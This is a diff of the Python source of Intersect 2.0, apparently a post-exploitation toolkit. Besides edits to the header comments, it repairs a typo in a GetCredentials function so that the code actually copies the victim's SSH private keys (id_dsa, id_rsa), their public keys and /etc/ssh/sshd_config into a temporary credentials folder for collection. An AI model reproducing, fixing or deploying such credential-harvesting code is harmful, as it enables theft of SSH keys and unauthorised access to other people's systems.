@@ -1,14 +1,14 @@
 #!/usr/bin/python
 # intersect 2.0 | created by ohdae
-# email: bindshell@live.com  
+# email: bindshell[at]live[dot]com
+# twitter: @ohdae
 # http://github.com/ohdae/Intersect-2.0/ || http://bind.shell.la/projects/Intersect
 #
 # To see the full description of Intersect 2.0, view the attached ReadMe file.
 # The ToDo-List will be updated frequently to show changes, upcoming features, bug fixes, etc.
-# If you find any bugs or have any suggestions or comments, please contact the developer
 #
-# Quite a few of these features are being reworked, things are being added, etc.
-# Updates will be rolled out frequently as I work through the code and fix things. Enjoy!
+# If you find any bugs or have any suggestions or comments, please contact the developer!
+#
 #-------------------------------------------------------------------------------------------------
 #   Copyright (C) 2012  ohdae | bindshell@live.com
 #
@@ -212,9 +212,9 @@ def GetCredentials():
     if os.path.isfile("/etc/ssh/sshd_config") is True:
         shutil.copy2("/etc/ssh/sshd_config", Temp_Dir+"/credentials/") 
     if os.path.isfile(Home_Dir+'/.ssh/id_dsa') is True:
-        shutilcopy2(Home_Dir+'/.ssh/id_dsa', Temp_Dir+"/credentials/")
+        shutil.copy2(Home_Dir+'/.ssh/id_dsa', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_dsa.pub') is True:
-        shutilcopy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
+        shutil.copy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_rsa') is True:
          shutil.copy2(Home_Dir+'/.ssh/id_rsa', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_rsa.pub') is True: 
